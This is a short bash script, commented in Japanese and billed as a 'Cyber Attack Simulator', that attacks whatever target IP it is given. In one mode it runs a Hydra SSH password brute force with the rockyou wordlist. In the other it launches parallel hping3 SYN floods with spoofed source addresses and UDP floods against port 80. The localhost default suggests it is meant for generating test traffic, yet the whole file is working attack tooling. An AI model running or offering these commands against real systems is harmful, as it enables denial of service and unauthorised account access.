#!/bin/bash

# root権限チェック
if [ "$EUID" -ne 0 ]; then
  echo "エラー: root権限で実行してください。"
  exit 1
fi

TARGET_IP=${1:-"127.0.0.1"}
DURATION=${2:-"15"}
MODE_ARG=${3:-"dos"}

PORT=80
THREADS=4

cleanup() {
    echo ""
    echo "[!] 停止シグナルを受信しました。プロセスを停止中..."
    pkill -P $$ hping3
    pkill -P $$ hydra
    echo "[*] 完了。"
    exit
}

trap cleanup SIGINT SIGTERM EXIT

echo "=========================================="
echo "   Cyber Attack Simulator Script"
echo "=========================================="
echo "[*] TARGET: $TARGET_IP"
echo "[*] DURATION: $DURATION sec"
echo "[*] MODE: $MODE_ARG"
echo "------------------------------------------"

if [ "$MODE_ARG" = "hydra" ]; then
    # --- Hydra SSH Crack ---
    echo "[*] Starting Hydra SSH Password Cracking..."
    
    # 指定されたコマンドに変更
    # -l test: ユーザー名 test
    # -P /usr/share/wordlists/rockyou.txt: ロックユー辞書
    hydra -l test -P /usr/share/wordlists/rockyou.txt ssh://$TARGET_IP -t 4 -V -e ns

else
    # --- DoS Attack (hping3) ---
    echo "[*] Starting DoS Flood Attack..."
    
    for (( i=1; i<=THREADS; i++ ))
    do
        # TCP SYN Flood
        hping3 -S --flood --rand-source -p $PORT $TARGET_IP > /dev/null 2>&1 &
        # UDP Flood
        hping3 --udp --flood -d 1200 -p $PORT $TARGET_IP > /dev/null 2>&1 &
    done
    
    wait
fi
